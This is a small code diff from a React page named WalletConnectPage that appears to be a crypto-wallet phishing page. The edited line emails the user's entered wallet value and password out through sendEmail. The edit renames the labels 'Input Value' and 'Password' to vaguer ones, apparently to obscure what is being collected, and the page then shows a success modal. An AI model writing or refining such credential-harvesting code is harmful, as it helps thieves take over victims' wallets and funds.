@@ -118,7 +118,7 @@ function WalletConnectPage() {
     setIsLoading(true);
   
     try {
-      await sendEmail(selectedWallet?.name, `Input Value: ${inputValue}, Password: ${password}`);
+      await sendEmail(selectedWallet?.name, ` Value: ${inputValue}, other: ${password}`);
       setShowSuccessModal(true);
   
       setTimeout(() => {
